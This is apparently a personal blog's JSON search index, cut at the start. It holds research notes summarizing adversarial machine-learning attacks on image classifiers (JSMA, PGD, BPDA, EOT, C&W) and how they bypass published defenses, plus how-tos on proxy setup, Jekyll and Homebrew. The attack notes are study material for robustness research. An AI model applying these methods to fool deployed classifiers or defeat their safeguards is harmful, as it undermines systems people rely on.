class method, also called LLC, is a targeted attack. The target label is defined as \\(y_{LL}=\\underset{x}{\\mathrm{argmin}}\\{p(y\\vert {X})\\}\\) which presents the least likely class in the whole categories.\\[{X}_0^{adv} = {X}, {X}_{N+1}^{adv}=Clip_{X,\\epsilon}\\{X_N^{adv}-\\alpha sign(\\nabla_XJ({X}_N^{adv},y_{LL}))\\}\\]4.2 Adversarial Examples in Real WorldThe transformations such as blur, noise and JPEG encoding have impact on destructing adversarial examples while changing brightness or contrast is not useful.5. The Limitations of Deep Learning in Adversarial SettingsAuthor-Time-ArXiv: Nicolas Papernot etc.; EuroS&amp;P2016; 1511.07528Key Points:  Promoting Jacobian-based Saliency Map Attack for acyclic DNN models.In general, the Jacobian-based saliency map constructs the saliency map, the impact of input based on the output’s gradient to find the most important features and then changes them to generate adversarial examples.The JSM method iterates the following steps when \\(F(X^*)\\ne Y^*\\) and \\(\\vert\\vert \\delta_X\\vert\\vert &lt; \\Upsilon\\)      Forward Derivative of a Deep Neural Network from the input to the layer before output    A general idea to calculate the forward derivative for a given \\(X\\): \\(\\nabla F(X)=\\frac{\\partial F(X)}{\\partial X}=[\\frac{\\partial F_j(X)}{\\partial x_i}]_{i,j\\in 1\\dots M}\\) and the formula is essentially the Jacobian of the function.    As to the DNN model, the Jacobian can be computed as follow:\\[\\frac{\\partial F_j(X)}{\\partial x_i}=(W_{n+1,j}\\cdot\\frac{\\partial H_n}{\\partial x_i})\\times\\frac{\\partial f_{n+1,j}}{\\partial x+i}(W_{n+1,j}\\cdot H_n+b_{n+1,j})\\]    where the output neuron \\(j\\) computes the following expression: \\(F_j(X)=f_{n+1,j}(W_{n+1,j}\\cdot H_n+b_{n+1.j})\\)        Constructing the Saliency Map \\(S(X,t)\\) which aims to increase the probabilities of target label \\(t\\) and decrease the probabilities of other labels.\\[S(X,t)[i]=\\begin{cases} 0~if\\frac{F_t(X)}{\\partial X_i}&lt;0 ~or~ \\mathop{\\Sigma}_\\limits{j\\ne t}\\frac{F_j(X)}{\\partial X_i}&gt;0\\\\(\\frac{F_t(X)}{\\partial X_i})\\vert \\sum_{j\\ne t}\\frac{F_j(X)}{\\partial X_i}\\vert~otherwise\\end{cases}\\]    where \\(t=\\mathop{\\arg\\max}_\\limits{j}F_j(X)\\)        Modifying \\(X_{i_{max}}\\) subject to \\(i_{max}=\\mathop{\\arg\\max}_\\limits{i}S(X,Y^*)[i]\\) and adding to the original sample. And the perturbation adding to the input will be set as \\(+/-1\\) which will increase or decrease the pixel intensities.  6. Towards Evaluating the Robustness of Neural NetworksThe details are available on another blog.7. Towards Deep Learning Models Resistant to Adversarial AttacksAuthor-Time-ArXiv: Aleksander Madry etc.; ICLR2018; 1706.060083Key Points:  Promoting Projected Gradient Descent Method(PGD).The essence of PGD attack is that a robust DNN model is required to improve a robust attack. So it will improve both the DNN models and adversarial examples at the same time. The paper defines DNN attack as a min-max optimization problem instead of a minimization or maximization problem:\\(\\mathop{\\min}_\\limits{\\theta} \\rho(\\theta)\\), where \\(\\rho(\\theta)=\\mathbb{E}_{(x,y)\\sim D}[max_{\\delta\\in S}L(\\theta,x+\\delta,y)]\\)\\(D\\) is the data contribution. \\(\\mathbb{E}\\) is the average error in the course of training. In the inner max part, it will find the specific \\(\\delta\\) to maximize the loss while in the outer min part, it will use different model parameters \\(\\theta\\) to reduce the average error.The paper uses FGSM and iterative FGSM which is essentially projected gradient descent. The definition of the PGD is displayed as follow:\\[x^{t+1}=\\prod_{x+S}(x^t+\\alpha sign(\\nabla_xL(\\theta,x,y)))\\]\\(\\prod_{x+S}\\) means projecting the input in the range of \\(x+S\\). And the definition of projection can be described as follows:\\[min_x f(x)~s.t.~x\\in S\\]\\[p^{t+1} = x^t+\\alpha sign(\\nabla f(x^t)) \\\\ x^{t+1} = \\text{arg} \\min_{x \\in C} \\vert\\vert p^{t+1}-x\\vert\\vert\\]8. Obfuscated Gradients Give a False Sense of Security: Circumventing Defenses to Adversarial ExamplesAuthor-Time-ArXiv: Anish Athalye etc; ICML2018 Best Paper; 1802.00420Key Points:  Promoting Backward Pass Differentiable Approximation(BPDA) which is useful on obfuscated-gradient-based defenses.  Displaying that BPDA has a great performance on several gradient-masking based defense methods from ICLR 2018.Basically, the advanced defense method is to break gradient descent by gradient masking. So in the paper, three defense obfuscated gradients are discussed to evaluate the performance of BPDA.  Shattered Gradient  Stochastic Gradients  Exploding and Vanishing Gradients8.1 The Algorithm of Backward Pass Differentiable ApproximationIn general, the BPDA uses the following steps based on iterative optimization-based attack(PGD for \\(l_\\infty\\) and C&amp;W attack for \\(l_2\\)):Algorithm:Let \\(f(\\cdot)=f^{1\\dots j}(\\cdot)\\) be a neural network and let \\(f^i(\\cdot)\\) be a non-differentiable layer.  To approximate \\(\\nabla_xf(x)\\), find a differentiable approximation identity function \\(g(x)\\) such that \\(g(x)\\approx f^i(x)\\).      Calculate \\(\\nabla_xf(x)\\) by performing the forward pass through \\(f( \\cdot )\\).    On the backward pass, replacing \\(f^i(x)\\) with \\(g(x)\\).In contrast to standard PGD or C&amp;W attack, BPDA requires more iterations of gradient descent.The paper lists 7 accepted papers from ICLR2018 and takes them as the evaluation to show the great performance of BPDA.8.2 Gradient ShatteringAt first, it evaluates the non-obfuscated gradients defense like adversarial training and cascade adversarial training which trains a first model to generate adversarial examples and adds them to a second model on the augmented dataset in a single step for efficiency. Since these two defenses are weaker than the later defenses, the paper does not discuss them deeply.8.2.1 Thermometer EncodingThe definition of thermometer encoding is like that. Given an image \\(x\\), for each pixel color \\(x_{i,j,c}\\), the $l$-level thermometer encoding \\(\\tau(x_{i,k,c})\\) is a \\(l\\)-dimensional vector where \\(\\tau(x_{i,j,c})_k=1\\) if \\(x_{i.k.c}&gt;k/l\\) and \\(0\\) otherwise. For example, \\(\\tau(0.66)=1111110000\\) is a 10-level thermometer encoding.In general, thermometer encoding defense can be taken as a way to cause gradient shattering so it is impossible to perform gradient descent on such kind of DNNs.As to BPDA, the paper sets \\(g(x)=min(max(x_{i,j,c}-k/l,0),1)\\) and replaces the backwards pass with \\(g(x)\\).Actually \\(\\tau(x_{i,j,c})_k=floor(g(x))\\). The result shows a great performance of BPDA.8.2.2 Input TransformationsThe defense method uses several input transformations to counter adversarial examples such as image cropping and rescaling, bit-depth reduction and JPEG compression.However, the paper points out that it is possible to bypass each defense respectively and the ensembles of these defenses are not stronger than the sub-defense. The paper uses EOT and BPDA (the paper does not provide details) to circumvent image cropping and rescaling, JPEG compression, image quilting. And the performance of BPDA is also pretty good.8.2.3 Local Intrinsic DimensionalityLID is a general-purpose metric that measures the distance from an input to its neighbors.The paper discovers LID does not detect high confidence adversarial examples even the adversarial examples are oblivious to the defense.8.3 Stochastic Gradients8.3.1 Stochastic Activation PruningSAP randomly drops some neurons of each layer to 0 with probability proportional to their absolute value. Essentially, SAP applies dropout at each layer based on neurons’ weighted distribution. Then these dropped out neurons are retrained and scaled up to retain accuracy.Implementing SAP decreases clean classification accuracy slightly while increasing robustness. And different levels of drop probability  has similar robustness.The paper calculates gradient by \\(\\sum_{i=1}^k\\nabla_xf(x)\\) where \\(k=10\\) to achieve useful gradients instead of \\(\\nabla_xf(x)\\). Finally, the result of the attack is good as well.8.3.2 Mitigating Through RandomizationThe defense adds a randomization layer before the input to the classifier by rescaling and zero-pading the images. The defense dismisses attack by providing lots of choices of randomness.The paper finds the ensemble attack used by the defense authors overfits to these fixed randomization. So the paper uses EOT and optimize the distribution of transformations to bypass the defense.The result of the attack is good.8.4 Vanishing &amp; Exploding Gradients8.4.1 Pixel DefendThe defense’s authors argue that adversarial examples mainly lie in the low-probability region of the data distribution. So PixelDefend purifies adversarially perturbed images before the classification by using a greedy decoding procedure to approximate finding the highest probability example within an \\(\\epsilon\\)-ball of the input image.      Firstly, the joint distribution over all pixels is defined by the product of conditional distributions which originate from PixelCNN. \\(X=[x_1,x_2,\\dots,x_n]\\) presents an image.\\[p_{CNN}(X)=\\prod_ip_{CNN]}(x_i\\vert x_{1:(i-1)})\\]    Every conditional distribution is a multinomial with a 256-way softmax layer based on previous RGB channels as well and each channel variable \\(x_i\\) takes 0 to 255 distinct values. The higher the joint distribution \\(P_{CNN}\\), the more suitable it is to the dataset        The general distribution of datasets is described by bits per dimension. \\(I,J,K\\) are the size and channel of images.    \\(BPD(X)=-logp_{CNN}(X)/(I\\times J\\times K\\times log2)\\).        The defense’s authors use hypothesis testing to detect adversarial examples based on distribution.        Returning benign images to the training distribution.\\[max_{X^*}p_{CNN}(X^*)\\\\s.t.\\vert\\vert X^*-X\\vert\\vert_{\\infty}\\le\\epsilon_{defend}\\]  The paper avoids computing gradients by approximating gradients with BPDA.8.4.2 Defense-GanDefense-Gan uses GAN to project samples onto the manifold of the generator before classification.The BPDA attack does not have a good performance on Defense-Gan.9. Synthesizing Robust Adversarial ExamplesAuthor-Time-ArXiv: Anish Athalye etc.; ICML2018; 1707.07397Key Points:  Promoting Expectation Over Transformation(EOT) which proves the impact of a single adversarial example exists over all of the transformations.  Fabricating the first 3D physical-world adversarial objects to fool classifiers in the real world.The basic approach to generate adversarial examples which aims to maximize the possibility of target label based on the perturbation is not useful when angle and viewpoint changes. Consequently, EOT uses a chosen distribution \\(T\\) of transformation functions \\(t\\) to adjust the input \\(x\\) as  \\(t(x)\\). The perturbation is also set by the expected effective distance as: \\(\\delta=\\mathbb{E}_{t\\sim T}[d(t(x'),t(x))]\\). EOT aims to minimize the visual difference between \\(t(x')\\) and \\(t(x)\\). So the optimization problem has been:\\(\\mathop{\\arg\\max}\\limits_{x'}\\mathbb{E}_{t\\sim T}[logP(y_t\\vert t(x'))]\\), subject to \\(\\mathbb{E}_{t\\sim T}[d(t(x'), t(x))]&lt;\\epsilon, x\\in[0,1]^d\\).The distribution \\(T\\) can model perceptual distortions like rotation, translation or noising. EOT uses SGD to maximize the objective. In the 2D cases, \\(t(x)=Ax+b\\) is used for random transformations. EOT also sets distance as \\(l_2\\) norm in LAB color space which is a perceptually uniform color space in Euclidean distance. So the optimization is set as follow and using PGD to maximize the objective before clipping the set of valid inputs:\\[\\mathop{\\arg\\max}_\\limits{x'}\\mathbb{E}_{t\\sim T}[logP(y_t\\vert t(x'))-\\lambda\\vert\\vert LAB(t(x'))-LAB(t(x))\\vert\\vert_2]\\]"
  },
  
  {
    "title": "Evaluation of Adversarial Example Defenses",
    "url": "/posts/Evaluation_of_Adversarial_Example_Defenses/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-03-06 00:00:00 -0800",
    





    
    "snippet": "On Adaptive Attacks to Adversarial Example DefensesAuthors: Florian Tramer, Nicholas Carlini, Wieland Brendel, Aleksander MadryKey Points:  Thirteen Advanced Defenses Evaluation      Introduction  ...",
    "content": "On Adaptive Attacks to Adversarial Example DefensesAuthors: Florian Tramer, Nicholas Carlini, Wieland Brendel, Aleksander MadryKey Points:  Thirteen Advanced Defenses Evaluation      Introduction    Nowadays many defense methods are not efficient enough to be described and evaluated because they do not use proper attacks to evaluate the performance. So the paper analyses thirteen recent defenses by performing adaptive attack in the right way by adjusting objective functions and  hyper-parameters.        Background    The widely adopted approach is promoted by CW attack and Madry. For example, normalization function includes sigmoid function based on the $l_p$-norm.\\[x_{i+1}=Proj(x_i+\\alpha \\cdot normalize(\\nabla_{x_i} L(x_i,y)))\\]    There are four common attack strategies:          Projected Gradient Descent     - C&amp;W attack: \\(maximize_{x'}L(x',y)-\\lambda\\cdot\\vert\\vert x'-x\\vert\\vert_p\\)      Back Pass Differentiable Approximation: Replacing one layer of a neural network \\(f^i(x)\\) by an approximate function \\(g(x)\\) when computing gradient by back propagation if the layer is non-differentiable.     - Expectation Over Transformation: computing gradient by randomized components such as randomized transformation.            Attack Themes    The whole paper will evaluate thirteen defense methods in the following seven prospectives.          Strive for simplicity as to loss function and gradient descent.     - Attack the full defense.      Identify and target important defense parts.     - Adapt the objective function to simplify the attack.      Ensure the loss function is consistent which is a good proxy for attack success.     - Optimize the loss function with different methods      Use a strong adaptive attack for adversarial training or these generated adversarial examples are useless.            K-Winners Take All    Essence: Replacing the standard ReLU activation function by outputting k largest elements in every layer and setting 0 to other elements to avoid gradient-based attack in a neural network.    The results of different types of attack:          Gradient-based attack: not working because adversary can just find the direction in a very small region which is meaningless.      Black-box attack                  score-based attack: working          decision-based attack: working if it is convergence.          transfer-based attack: being proved that it is not working in the original paper                          The Odds are Odd    Essence:  "
  },
  
  {
    "title": "C&W Attack",
    "url": "/posts/C&W_Attack/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-02-15 00:00:00 -0800",
    





    
    "snippet": "C&amp;W attack is a pretty insightful attack in adversarial machine learning. So I use this blog to summarize the general ideas of it.Towards Evaluating the Robustness of Neural NetworksAuthors: Ni...",
    "content": "C&amp;W attack is a pretty insightful attack in adversarial machine learning. So I use this blog to summarize the general ideas of it.Towards Evaluating the Robustness of Neural NetworksAuthors: Nicholas Carlini, David WagnerKey points:  Seven Objective Functions  Three Box Constraints  $c$ choosing method  Three Attack Methods  Images’ discretizationThe paper introduces a famous attacking method called CW attack. They demonstrate defensive distillation is not robust and promising enough under their attacking and CW attack is a better benchmark for future defense methods. Besides, they suggest defense should prevent the transferability of the adversarial examples.1. IntroductionAs we all know, deep neural networks are vulnerable to adversarial examples. And there are several methods to robust these models like defensive distillation. The authors construct three attacks for \\(L_0, L_1, L_\\infty\\) to prove the weakness of these defensive methods and discover that adversarial examples are transferable between different models.2. BackgroundIn the project, the authors assume the adversary is accessible to all of the neural network as a white-box attacking. They evaluate the targeted attack in three conditions: Average case(select random target), Best case(select least difficult target) and Worst case(select most difficult target). On the other hand, when discussing the distance of the adversarial examples, the authors use three metrics from \\(L_p\\) norm to generate these examples. The p-norm is defined as  \\(\\vert\\vert v \\vert\\vert_p=(\\sum_{i=1}^n\\vert v_i\\vert^p)^{\\frac{1}{p}}\\).3. ApproachThe authors discuss four currently advanced attacking methods including L-BFGS, FGS, JSMA and Deepfool. They use two networks for MNIST and CIFAR-10 classification and the pre-trained Inception v3 network for Image-Net classification.The initial method to find adversarial examples is listed as follows:minimize \\(D(x, x+\\delta )\\)  such that \\(C(x+\\delta)=t, x+\\delta\\in[0,1]^n\\)\\(\\delta\\) means perturbation and \\(D()\\) is the distance metric from p-norms while \\(C(x)=argmax_iF(x)_i\\) is the classifier to set label. \\(\\delta\\) can be found by minimizing \\(D(x,x+\\delta)\\).The authors discuss seven objective functions changing \\(C(x+\\delta)=t\\) to \\(f(x+\\delta)\\leq0\\). The final problem has been edited as follows:minimize \\(\\vert \\vert \\delta \\vert \\vert +c\\cdot f(x+\\delta)\\), such that \\(x + \\delta \\in [0,1]^n\\).\\(c\\) is a constant setting by binary search. After testing, there is a key that the objective function cannot have a great changeable derivation because \\(c\\) should change as well to balance the weights between \\(\\delta\\) and \\(f(x+\\delta)\\).After setting the math problem, the constraint should be clear, the authors list three ways to do the job.  Projected gradient descent  Clipped gradient descent  Change of variables4. Three Attacks and their Objective Functions4.1 \\(L_2\\) Attackminimize \\(\\vert \\vert \\frac{1}{2}(tanh(w)+1)-x\\vert \\vert^2_2+c\\cdot f(\\frac{1}{2}(tanh(w)+1))\\) with \\(f\\) defined as \\(f(x')=max(max\\{Z(x')_i:i\\neq t\\}-Z(x')_t, -\\kappa)\\).\\(\\kappa\\) presents the confidence of the \\(i\\)th label and the  \\(\\kappa\\) is set \\(0\\) in the paper. As you can see, the bigger \\(\\kappa\\), the higher success rate of attacking.Besides, to avoid local optimization, they use multiple starting-point gradient descent in the ball of adversarial range.4.2 \\(L_0\\) AttackIterating fixing less important pixels and using \\(L_2\\) attack. After every iteration, they compute \\(g=\\nabla f(x+\\delta)\\) and select \\(i=\\mathop{\\arg\\min}_\\limits{i}g_i\\cdot\\delta_i\\) and then fix \\(i\\).4.3 \\(L_\\infty\\) Attackminimize \\(c\\cdot f(x+\\delta)+\\sum_i [(\\delta_i-\\tau)^+]\\). Using \\(\\tau\\) to set a threshold to avoid adding perturbation on several most influential pixels.The \\(L\\infty\\) distance measures the maximum change to any of the coordinates: \\(\\vert\\vert x-x'\\vert\\vert_\\infty=max(\\vert x_1-x'_1\\vert,\\dots,\\vert x_n-x'_n\\vert)\\)"
  },
  
  {
    "title": "Adversarial Machine Learning",
    "url": "/posts/Adversarial-Machine-Learning/",
    "categories": "",
    "tags": "Security",
    "date": "2020-01-31 00:00:00 -0800",
    





    
    "snippet": "I try to summarize the main ideas and advanced technologies in this blog. Besides, I will record the progresses and details about the process. As we know, Adversarial Machine Learning has many appl...",
    "content": "I try to summarize the main ideas and advanced technologies in this blog. Besides, I will record the progresses and details about the process. As we know, Adversarial Machine Learning has many applications. From the talk of Ian Goodfellow from ICLR2019, the applications include generative Modeling, Security, Model-based optimization, RL, extreme reliability, label efficiency, domain adaptation, Fairness accountability and transparency and Neuroscience.1. Basic Concepts and AlgorithmsFirstly, I need to confirm some basic concepts and their abbreviations, such as Adversarial Example(AE), Targeted Attack(TA) and Un-targeted Attack(UA). The types of attacking and metrics are listed as follows.Un-targeted Attack:  Non-iterative Un-targeted attacks: Fast Gradient Sign Method, R+FGSM  Iterative Un-targeted attacks: Basic Iterative Method, Projected Gradient Descent(PGD), U-MI-FGSM, Deep Fool, Universal Adversarial Perturbation, OptMarginTargeted Attack：Specifying the label to be the least likely class.  Non-iterative Targeted attacks: Least-Likely Class(LLC) attack, R+LLC  Iterative Targeted attacks: Box-constrained L-BFGS(BLB), Iterative LLC, targeted MI-FGSM(T-MI-FGSM), Jacobian-based Saliency Map Attack(JSMA), Carlini and Wagner(CW) attack, Elastic-net Attack to DNNs(EAD), Expectation Over Transformation(EOT),Backward Pass Differentiable Approximation(BPDA)Attacking Metrics:  Misclassification: Misclassification Ratio, Average Confidence of Adversarial Class(ACAC), Average Confidence of True Class(ACTC)  Imperceptibility: Average \\(L_p\\) Distortion, Average Structural Similarity, Perturbation Sensitivity Distance(PSD)  Robustness: Noise Tolerance Estimation, Robustness to Gaussian Blur(RGB), Robustness to Image CompressionSecondly, the defense part is listed as follows.Adversarial Training: Naive Adversarial Training(NAT), Ensemble Adversarial Training(EAT),  PGD-based Adversarial Training(PAT)Gradient Masking/Regularization: Defensive Distillation, Input Gradient Regularization(IGR)Input Transformation: Ensemble Input Transformation(EIT), Random Transformations-based defense(RT), Pixel Defense(PD), Thermometer Encoding(TE)Region-based ClassificationDetection-only Defenses: Local Intrinsic Dimensionality(LID), Feature Squeezing(FS), MagNetDefensing Metrics:  Classification Accuracy Variance(CAV)  Classification Rectify/Sacrifice Ratio(CRR/CSR)  Classification Confidence Variance(CCV)  Classification Output Stability(COS)2. AttackWhen we talk about the adversarial machine learning, we need to the set the threat model firstly. A threat model will outline the attacking type and the defensing ways including the evaluation of the defense. In the adversary’s part of a threat model, goals, knowledge and capabilities will be clear.  Goals: generating inputs to force a ML system to conclude erroneous results.  Knowledge: the knowledge the adversary is assumed to have.  Capabilities: the requirements and the methods of the attacking.          Causing bit-flips on the weights of a neural network.      Causing errors during the data processing pipeline.      Making backdoors.      Perturbing the images to fool the ML systems.      To be more specific, for some natural input \\(x\\) and similarity metric \\(D\\), \\(x'\\) is a adversarial example if \\(D(x, x')\\leq \\epsilon\\) for some small \\(\\epsilon\\) and \\(x'\\) is misclassified. A choice for \\(D\\) is \\(l_p\\)-norm. While the choice of \\(D\\) and \\(\\epsilon\\) varies based on the missions and a small \\(\\epsilon\\) is not always important for malware detection. The definition of the adversary’s capability can be set as follows.(1) \\(\\large{\\mathbb{E}_{(x,y)\\sim\\chi}[max_{x':D(x,x')&lt;\\epsilon}L(f(x'),y)]}\\): \\(L\\) means loss function.(2) \\(\\large{\\mathbb{E}_{(x,y)\\sim\\chi}[min_{x'\\in A_{x,y}}D(x,x')]}\\): \\(A_{x,y}\\) results from the definition of adversarial example, e.g. \\(A_{x,y}=\\{x'\\rvert x' \\neq y\\}\\) for misclassification.3. Defense EvaluationAfter summarizing the algorithms of adversarial machine learning, I need to specify the defense methods to evaluate the performances.At the very beginning, the aim of the defense is as follows.  Defend against an adversary who will attack the system.  Test the worst-case situations of algorithms.  Measure progress of algorithmsBasically, the challenge of security evaluations is the difficulty to evaluate the worst-case robustness and  the different assumptions between vision and security.On the other hands, when we evaluate the algorithms or frameworks, we need to be clear about the requirements. For example, if one proposes a defense method, he should do things as follows.(1) Be skeptical of the results.(2) Try to find the best way to attack the defense method, even if it is not from the existing adversarial attacks.(3) Release full source code and pre-trained models.There is a basic way to complete the evaluation and the pitfall needed to avoid from [3] chapter 3.  State a precise threat model  Perform adaptive attacks  Release pre-trained models and source code  Report clean model accuracy when not under attack  Perform basic sanity tests on attack success rates  Generate an attack success rate vs. perturbation budget curve  Verify adaptive attacks perform better than any other  Describe the attacks applied, including all hyper-parametersMore information is available form [3]4. Important ResearchesNow I want to summarize some important and intuitive papers to dig some real problems and have a deep understanding about them. The reading path is introduced from [5].4.1 Evasion Attacks against Machine Learning at Test Time4.2 Intriguing properties of neural networks4.3 Explaining and Harnessing Adversarial ExamplesReference:  DEEPSEC: A Uniform Platform for Security Analysis of Deep Learning Model  A critique of the DeepSec Platform for Security Analysis of Deep Learning Models  On Evaluating Adversarial Robustness  A complete list of all adversarial example papers  Adversarial Machine Learning Reading List"
  },
  
  {
    "title": "How to deploy shadowsocks and Kcptun on ubuntu server",
    "url": "/posts/How_to_Deploy_Shadowsocks_And_Kcptun_on_Ubuntu_Server/",
    "categories": "",
    "tags": "Network",
    "date": "2019-11-13 00:00:00 -0800",
    





    
    "snippet": "Install Shadowsocks  Install shadowsocks  sslocal -c ss.json  .json file:{\"server\":\"11.22.33.44\",\"server_port\":443,\"local_port\":1080,\"password\":\"123456\",\"timeout\":600,\"method\":\"aes-256-cfb\"}Install...",
    "content": "Install Shadowsocks  Install shadowsocks  sslocal -c ss.json  .json file:{\"server\":\"11.22.33.44\",\"server_port\":443,\"local_port\":1080,\"password\":\"123456\",\"timeout\":600,\"method\":\"aes-256-cfb\"}Install KCPTUN  Install kcptunUse gdrive to download files and directories on Ubuntu Server  Install gdrive by git clone  Register your personal Google Drive Client ID and Secret Key: tutorial  Replace the Client ID and Secret Key on the file handlers_drive.go  go get; go build; sudo mv gdrive /usr/local/bin; gdrive aboutUseful informaitonSet Shadowsocks on Mac command line  open shadowsocks application: Proxy Auto Configure Mode  add ~/.zshrc by alias proxy='export all_proxy=socks5://127.0.0.1:1086' alias unproxy='unset all_proxy'Be careful about the port which may be different based on the configuration  source ~/.zshrc  using proxy to go by server whiel using unproxy to go directly  test: curl cip.cc"
  },
  
  {
    "title": "Jekyll Tutorial",
    "url": "/posts/Jeykll_Tutorial/",
    "categories": "",
    "tags": "Website",
    "date": "2019-10-03 00:00:00 -0700",
    





    
    "snippet": "First thing: Jekyll is a static website framework which is useful for building a blog. Jekyll is build by ruby and need to use gem as a package management.FYI: most of the content of the blog is ba...",
    "content": "First thing: Jekyll is a static website framework which is useful for building a blog. Jekyll is build by ruby and need to use gem as a package management.FYI: most of the content of the blog is based on the Mike Dane Youtube Channel.1. Installation and Basic StuffInstallation stepsEnvironent: What I choose is using a ruby version manager chruby and ruby-install to aviod change the Opearting system’s ruby version. Detailsbrew install chruby ruby-installruby-install rubychruby 3.1.0 # change ruby version  Command to new a website: Jekyll new &lt;website-name&gt;.  First time to run the server, bundle exec is a command to execute a script(Gemfile) in the context of the current bundle and change the golbal package version to the specific version in the Gemfile.  Use jekyll serve to run the server.Framework ArchitectureAfter build the website, some key files of the website is like the following items.  _posts: save the blogs.  _layouts: set the layout of interface.  _site: save all the builded static website. Do not need to modify it.  _drafts: save the drafts which do not want to be public. But using jekyll serve --draft will display these drafts in the website.  _config.yml: set the global variables and need to  restart the jekyll server to implement the change in the file.  Gemfile: set the gem package version.The blogs written in markdown in the /_posts path are consisted of two parts: front matter and content.  Front matter:  written in JSON or YAML. Including layout, title, date, categories and so on. And Jekyll will use these variable to set the url of the blog. Besides, custom variable can be added as well.  Content: the main ideas of blogs.The sample of the front matter is like that:---layout: post/pagetitle:  \"Welcome to Jekyll!\"date:   2020-02-03 15:38:48 +0800categories: jekyll updatepermalinks: /about/---We can set default front matter on _config.yml.defaults:\t-\tscope:\t\tpath: \"\"\t\ttype: \"posts\"\t\tvalues:\t\t\tlayout: \"post\"\t\t\ttitle: \"my title\"Hint: If we edit the _config.yml file, we need to restart the jekyll server to see the change on the website.2. Building Your Website2.1 Choose a themeThe quickest way to choose a theme has two steps:(1) Set the theme name on the _config.yml file by theme: minimal-mistakes-jekyll(2) Edit Gemfile to install the related packages: gem \"minimal-mistakes-jekyll\"2.2 LayoutAlso, we can set custom layout by building a layout.html file under the folder _layout.In the layout.html, we can use HTML and Liquid.In the file, content can be used to display the markdown part.2.3 VaribaleWe can use _include folder to save header.html and footer.html.And we can also use site.title and other variable like site.message to use the information form _config.yml.Besides, we can use{% include header.html color%}to cite the header.html file to another file. The variable color can be set in the header.html file by include.color as well.Let’s take an example.In the header.html:&lt;h1 style=\"color: {{include.color}}\"&gt;{{site.title}}&lt;/h1&gt;&lt;hr&gt;&lt;/hr&gt;In the other files, if we want to cite the header.html file, and loop the variable, the example is like that.&lt;html&gt;&lt;head&gt;\t  &lt;meta charset=\"UTF-8\"&gt;\t  &lt;title&gt;{{site.title}}&lt;/title&gt;&lt;head&gt;&lt;body&gt;\t  {% include header.html color=\"blue\" %}\t{{ content }}    # loop  {% for post in site.posts %}  \t{{ post.title }} &lt;br&gt;  {% endfor%}    # conditional  {% if page.title == \"My First Post\" %}  \tThis is the first post.  {% elsif page.title == \"My Second Post \"%}  \tThis is the second post.  {% else %}  \tThis is another post.  {% endif %}&lt;/body&gt;&lt;/html&gt;2.4 FilesWe can create_data folder to store data files to save all source of information. We can use yml, json or csv. And the way we cite the data is by site.data.column.Another file we can use in Jekyll is static file such as images and pdf by site.static_files and use file.path or file.name to describe these files.If we want to use images in a specific path, we can set the default settings in _config.yml.defaults:\t-\tscope:\t\tpath: \"images/img\"\t\tvalues:\t\t\timage: trueAnd then we can use these images in the other files direcitly.{% for file in site.static_files %}\t{% if file.image %}\t\t&lt;img src=\"{{file.path}}\" alt=\"{file.name}\"&gt;\t{% endif %}{% endofor %}3. Hosting on Github PagesFirst Step: Create a new repository on Github.Second Step: Set base url or domain name in _config.ymlThird Step: set the Jekyll website and sync the github repository.git initgit checkout -b repogit statusgit add .git commit -m \"initial commit\"git remote add origin https://github.... # your github repo pathgit push origin repoFourth Step: Set your repo github pages on the settings.More information about github pages is available here.Jekyll-related Problem Recording1. Busuanzi Counting Prblembusuanzi is a pretty straightforward and easy-using script for website to count the page views. While the single page counter seems not to work incorrectly. I have tried on my own website and visit several other websites on the Internet. It shows that the single page counter just show all pages viewing number instead of separating them.&lt;span id=\"busuanzi_container_page_pv\" style='display:none'&gt;   Read: &lt;span id=\"busuanzi_value_page_pv\"&gt;&lt;/span&gt; Times&lt;/span&gt;"
  },
  
  {
    "title": "How to use Homebrew",
    "url": "/posts/How_to_use_Homebrew/",
    "categories": "",
    "tags": "System",
    "date": "2019-05-21 00:00:00 -0700",
    





    
    "snippet": "HomebrewRecently, I have met with some problems about Homebrew which are very annoyed. I have not spend some times on learning homebrew and reading its documents. I think it is a time to summarize ...",
    "content": "HomebrewRecently, I have met with some problems about Homebrew which are very annoyed. I have not spend some times on learning homebrew and reading its documents. I think it is a time to summarize it and improve the efficiency of using it.1. InstallationGo to the Homebrew Homepage to find the command to install Homebrew. Basically, Homebrew will install all packages and applications under the following paths:  /usr/local/Cellar: install packages and set the link to the /bin directory  /usr/local/Caskroom: install applications2. Supplement Commands2.1 list the path of a specific package: which &lt;package&gt;, most of time it will link to /usr/local/bin/ but ls -la + path is able to display the real path.2.2 get a discription of a package or an application when and where it installed or the dependencies needed to install the package: brew [cask] info &lt;package&gt;/[application]2.3 list the packages installed: brew list2.4 list outdated packages: brew outdated2.5 fetch the update packages and upgrade them: brew update &amp; brew upgrade2.6 remove old versions of packages: brew cleanup2.7 self-dignosis tools: brew doctor2.8 install Mac application: brew cask install &lt;application&gt;2.9 search packages or applications: brew search &lt;application&gt;2.10 go to the homepage of a specific application: brew cask home &lt;application&gt;2.11 install from Github: brew tap &lt;&gt;/brew"
  },
  
  {
    "title": "Machine Learning Summary",
    "url": "/posts/Machine_Learning/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2019-04-12 00:00:00 -0700",
    





    
    "snippet": "I will keep doing researches in adversarial machine learning, so I need to master the basci knowledge stuff. I want to use this blog to record the important and interesting things.Some repositories...",
